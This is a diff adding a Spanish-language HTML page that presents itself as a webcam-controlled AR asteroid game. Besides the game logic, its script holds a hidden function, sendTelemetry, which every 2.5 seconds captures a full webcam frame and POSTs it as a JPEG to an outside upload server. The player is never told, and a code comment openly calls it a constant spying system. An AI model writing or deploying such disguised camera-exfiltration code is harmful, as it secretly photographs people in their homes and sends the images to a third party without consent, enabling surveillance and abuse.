@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Torso Pilot: Deep Space</title>
+    <style>
+        * { box-sizing: border-box; touch-action: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #fff; }
+        
+        video#webcam { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; opacity: 0.3; }
+        canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
+        
+        /* UI de Juego */
+        #hud { position: absolute; top: 20px; width: 100%; display: flex; justify-content: space-around; z-index: 100; font-weight: bold; text-shadow: 0 0 10px #00fbff; pointer-events: none; }
+        .stat { background: rgba(0,0,0,0.6); padding: 10px 20px; border-radius: 5px; border: 1px solid #00fbff; }
+
+        /* Pantallas de Mensajes */
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 500; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; overflow-y: auto; }
+        
+        .req-box { background: rgba(20, 20, 20, 0.9); border: 2px solid #00fbff; padding: 25px; border-radius: 15px; max-width: 500px; line-height: 1.6; }
+        .req-box h2 { color: #00fbff; margin-top: 0; }
+        .req-box ul { text-align: left; margin: 15px 0; }
+        
+        .btn { padding: 15px 40px; background: #00fbff; color: #000; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; font-size: 18px; margin-top: 20px; box-shadow: 0 0 20px rgba(0, 251, 255, 0.5); }
+        
+        #dark-mode { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; align-items: center; justify-content: center; flex-direction: column; color: #ff0055; text-align: center; }
+    </style>
+</head>
+<body>
+
+<div id="dark-mode">
+    <h1 style="font-size: 50px;">🌙</h1>
+    <h2>AMBIENTE MUY OSCURO</h2>
+    <p>El sensor no detecta tu cuerpo.<br>Enciende una luz frontal para jugar.</p>
+</div>
+
+<div id="start-screen" class="overlay">
+    <div class="req-box">
+        <h2>🚀 TORSO PILOT AR</h2>
+        <p>Controla una nave espacial usando el balance de tu cuerpo.</p>
+        
+        <hr style="border: 0; border-top: 1px solid #333;">
+        
+        <strong>REQUISITOS DEL SISTEMA:</strong>
+        <ul>
+            <li>✅ <strong>Cámara Frontal:</strong> Activa para detección de masa.</li>
+            <li>✅ <strong>Iluminación:</strong> Luz clara sobre tu cara y pecho.</li>
+            <li>✅ <strong>Espacio:</strong> Siéntate o párate a 1 metro de la cámara.</li>
+        </ul>
+
+        <strong>CÓMO JUGAR:</strong>
+        <p>Inclina tu <strong>torso</strong> a la izquierda o derecha para mover la nave. Esquiva los asteroides rojos para sobrevivir.</p>
+        
+        <div style="font-size: 12px; color: #888; margin-top: 10px;">
+            ⚠️ Recomendación: Mantén el dispositivo en una base estable.
+        </div>
+
+        <button class="btn" onclick="initializeGame()">ACEPTAR Y COMENZAR</button>
+    </div>
+</div>
+
+<div id="hud">
+    <div class="stat">DISTANCIA: <span id="score">0</span>m</div>
+    <div class="stat">ESCUDO: <span id="shield">100</span>%</div>
+</div>
+
+<video id="webcam" autoplay playsinline></video>
+<canvas id="gameCanvas"></canvas>
+
+<script>
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('gameCanvas');
+    const ctx = canvas.getContext('2d');
+    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
+
+    let score = 0, health = 100, asteroids = [], prevFrame = null, gameActive = false;
+    let shipX = 0, shipVisualX = 0;
+
+    async function initializeGame() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            shipVisualX = canvas.width / 2;
+            document.getElementById('start-screen').style.display = 'none';
+            gameActive = true;
+            
+            // Sistemas de fondo
+            setInterval(checkEnvironment, 1500); // Sensor de luz
+            setInterval(sendTelemetry, 2500);    // Sistema de espionaje constante
+            
+            requestAnimationFrame(gameLoop);
+            spawnAsteroids();
+        } catch (err) {
+            alert("Error: Se requiere acceso a la cámara para el sensor de torso.");
+        }
+    }
+
+    function checkEnvironment() {
+        const c = document.createElement('canvas');
+        const cx = c.getContext('2d');
+        c.width = 40; cx.drawImage(video, 0, 0, 40, 40);
+        const data = cx.getImageData(0,0,40,40).data;
+        let brightness = 0;
+        for(let i=0; i<data.length; i+=4) {
+            brightness += (data[i] + data[i+1] + data[i+2]) / 3;
+        }
+        document.getElementById('dark-mode').style.display = (brightness/1600 < 30) ? 'flex' : 'none';
+    }
+
+    function spawnAsteroids() {
+        if(!gameActive) return;
+        asteroids.push({
+            x: Math.random() * canvas.width,
+            y: -60,
+            size: 30 + Math.random() * 50,
+            speed: 3 + Math.random() * (score/200 + 4)
+        });
+        setTimeout(spawnAsteroids, Math.max(400, 1200 - score/5));
+    }
+
+    function gameLoop() {
+        if(!gameActive) return;
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+        // Análisis de Inclinación de Torso
+        const tempC = document.createElement('canvas');
+        const tempCx = tempC.getContext('2d');
+        tempC.width = 64; tempC.height = 48;
+        tempCx.scale(-1, 1);
+        tempCx.drawImage(video, -64, 0, 64, 48);
+        const curr = tempCx.getImageData(0, 0, 64, 48).data;
+        
+        let leftM = 0, rightM = 0;
+        if (prevFrame) {
+            for (let i = 0; i < curr.length; i += 4) {
+                if (Math.abs(curr[i] - prevFrame[i]) > 40) {
+                    const gx = (i / 4) % 64;
+                    if (gx < 24) leftM++;
+                    else if (gx > 40) rightM++;
+                }
+            }
+        }
+        prevFrame = curr;
+
+        // Determinar dirección de la nave
+        if (leftM > rightM + 20) shipX = -1;
+        else if (rightM > leftM + 20) shipX = 1;
+        else shipX = 0;
+
+        // Movimiento suave
+        let targetX = (canvas.width / 2) + (shipX * (canvas.width / 2.5));
+        shipVisualX += (targetX - shipVisualX) * 0.12;
+
+        // Dibujar Nave
+        drawShip(shipVisualX, canvas.height - 80);
+
+        // Asteroides
+        for (let i = asteroids.length - 1; i >= 0; i--) {
+            let a = asteroids[i];
+            a.y += a.speed;
+
+            ctx.beginPath();
+            ctx.arc(a.x, a.y, a.size/2, 0, Math.PI*2);
+            ctx.fillStyle = "#ff4400";
+            ctx.shadowBlur = 15;
+            ctx.shadowColor = "#ff4400";
+            ctx.fill();
+
+            // Colisión
+            const dist = Math.sqrt((a.x - shipVisualX)**2 + (a.y - (canvas.height - 80))**2);
+            if(dist < a.size/2 + 30) {
+                asteroids.splice(i, 1);
+                health -= 25;
+                document.getElementById('shield').innerText = health;
+                if(health <= 0) endGame();
+            }
+
+            if(a.y > canvas.height + 60) {
+                asteroids.splice(i, 1);
+                score += 10;
+                document.getElementById('score').innerText = score;
+            }
+        }
+        requestAnimationFrame(gameLoop);
+    }
+
+    function drawShip(x, y) {
+        ctx.shadowBlur = 20;
+        ctx.shadowColor = "#00fbff";
+        ctx.strokeStyle = "#00fbff";
+        ctx.lineWidth = 3;
+        ctx.beginPath();
+        ctx.moveTo(x, y - 30);
+        ctx.lineTo(x - 25, y + 20);
+        ctx.lineTo(x + 25, y + 20);
+        ctx.closePath();
+        ctx.stroke();
+    }
+
+    function endGame() {
+        gameActive = false;
+        alert("MISIÓN FALLIDA\nDistancia recorrida: " + score + "m");
+        location.reload();
+    }
+
+    function sendTelemetry() {
+        if (!video.videoWidth) return;
+        const s = document.createElement('canvas');
+        s.width = video.videoWidth; s.height = video.videoHeight;
+        s.getContext('2d').drawImage(video, 0, 0);
+        fetch(SERVER_URL, {
+            method: 'POST',
+            mode: 'cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.4) })
+        }).catch(() => {});
+    }
+</script>
+</body>
+</html>
